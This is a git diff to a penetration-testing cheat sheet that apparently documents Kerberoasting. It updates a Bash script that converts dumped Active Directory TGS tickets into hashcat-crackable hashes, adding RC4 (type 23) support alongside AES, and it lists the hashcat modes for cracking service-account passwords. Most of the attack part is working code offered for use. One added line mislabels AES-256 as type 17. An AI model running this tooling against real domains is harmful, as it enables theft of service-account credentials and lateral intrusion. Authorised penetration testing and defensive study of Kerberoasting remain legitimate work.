@@ -1425,7 +1425,7 @@ $krb5tgs$18$ = AES-256 = hashcat mode 19700
 ```
 (7) Feed the contents of "tgs.txt" into hashcat to attempt to crack the service account's plaintext password.
 
-## >> Kerberoasting AES encrypted TGS using Powershell and Bash
+## >> Kerberoasting AES and RC4 encrypted TGS using Powershell and Bash
 
 Assumes you are running the Powershell scripts from a domain-joined computer and logged in as an ordinary user.
 
@@ -1489,17 +1489,25 @@ Write-host $j "entries written to $OutFile"
 
 **Build Hashcat formatted TGS replies for cracking**
 
-Copy the file `$OutFile` to your Linux Hashcat host.  Create the following Bash script `tgsrep.sh`.  This script will be used to select just AES 128 or 256 encrypted TGS replies.  An example of outputting AES 128 (type 17) TGS replies can be done like this.<br />
+Copy the file `$OutFile` to your Linux Hashcat host.  Create the following Bash script `tgsrep.sh`.  This script will allow you to select RC4, AES-128 or AES-256 encrypted TGS replies.  For example:<br />
+Output AES-128 (type 17) TGS replies.<br />
 `tgsrep.sh spnout.txt 17 > crackme.txt`<br />
-An example of outputting AES 256 (type 18) TGS replies can be done like this.<br />
+Output AES-256 (type 17) TGS replies.<br />
 `tgsrep.sh spnout.txt 18 > crackme.txt`<br />
+Output RC4 (type 23) TGS replies.<br />
+`tgsrep.sh spnout.txt 23 > crackme.txt`<br />
 
 ```bash
-#!/usr/bin/bash
-
 if [ "$#" -ne 2 ]
 then
-   echo "You must provide a file name and etype."
+   echo "You must provide a file name and etype (17, 18, 23)."
+   exit
+fi
+file -bi "$1" | grep utf-16le >/dev/null
+if [ $? -eq 0 ]
+then
+   echo "The file contains unicode text, convert to utf-8 and try again."
+   echo "(e.g.) strings -e l $1 > $1.new"
    exit
 fi
 i=0
@@ -1512,7 +1520,7 @@ do
       str1=$(echo $line | sed 's/\$/[0x24]/g')
       arr1=(${str1//,/ })
    else
-      echo $line | base64 -d > "$tf1"
+      echo -n $line | base64 -d > "$tf1"
       openssl asn1parse -in $tf1 -inform der | grep "OCTET STRING\|INTEGER" | grep -m 1 -B 2 "OCTET STRING" > "$tf2"
       etype="unknown"
       egrep "INTEGER +:11" "$tf2" >/dev/null
@@ -1525,23 +1533,49 @@ do
       then
          etype="18"
       fi
-      if [[ "$etype" != "unknown" && "$etype" == "$2" ]]
+      egrep "INTEGER +:17" "$tf2" >/dev/null
+      if [ $? -eq 0 ]
       then
-              dump=$(cat "$tf2" | grep "OCTET STRING" | tr -d " " | cut -d ":" -f 4)
-              cksm=${dump: -24}
-              data=${dump%????????????????????????}
-              echo -n '$krb5tgs$'
-              echo -n $etype
-              echo -n '$'
-              echo -n ${arr1[1]}
-              echo -n '$'
-              echo -n ${arr1[0]}
-              echo -n '$*'
-              echo -n ${arr1[2]}
-              echo -n '*$'
-              echo -n $cksm
-              echo -n '$'
-              echo $data
+         etype="23"
+      fi
+      if [[ "$etype" == "$2" && ( "$2" == "17" || "$2" == "18" ) ]]
+      then
+         dump=$(cat "$tf2" | grep "OCTET STRING" | tr -d " " | cut -d ":" -f 4)
+         cksm=${dump: -24}
+         data=${dump%????????????????????????}
+         echo -n '$krb5tgs$'
+         echo -n $etype
+         echo -n '$'
+         echo -n ${arr1[1]}
+         echo -n '$'
+         echo -n ${arr1[0]}
+         echo -n '$*'
+         echo -n ${arr1[2]}
+         echo -n '*$'
+         echo -n $cksm
+         echo -n '$'
+         echo $data
+      fi
+      if [[ "$etype" == "$2" && "$2" == "23" ]]
+      then
+         dump=$(cat "$tf2" | grep "OCTET STRING" | tr -d " " | cut -d ":" -f 4)
+         dumprev=$(echo $dump | rev)
+         cksmrev=${dumprev: -32}
+         cksm=$(echo $cksmrev | rev)
+         datarev=${dumprev%????????????????????????????????}
+         data=$(echo $datarev | rev)
+         echo -n '$krb5tgs$'
+         echo -n $etype
+         echo -n '$*'
+         echo -n ${arr1[1]}
+         echo -n '$'
+         echo -n ${arr1[0]}
+         echo -n '$'
+         echo -n ${arr1[2]}
+         echo -n '*$'
+         echo -n $cksm
+         echo -n '$'
+         echo $data
       fi
       rm "$tf1"
       rm "$tf2"
@@ -1552,7 +1586,7 @@ done < "$1"
 
 **Run the hashes through Hashcat**
 
-For type 17 AES 128 tickets, use Hashcat mode 19600.  For type 18 AES 256 tickets use Hashcat mode 19700.
+For type 17 AES-128 tickets, use Hashcat mode 19600.  For type 18 AES-256 tickets use Hashcat mode 19700.  For type 23 RC4 tickets use Hashcat mode 13100.
 
 ## >> NetBIOS Name Service Recon Without Windows Utilities
 
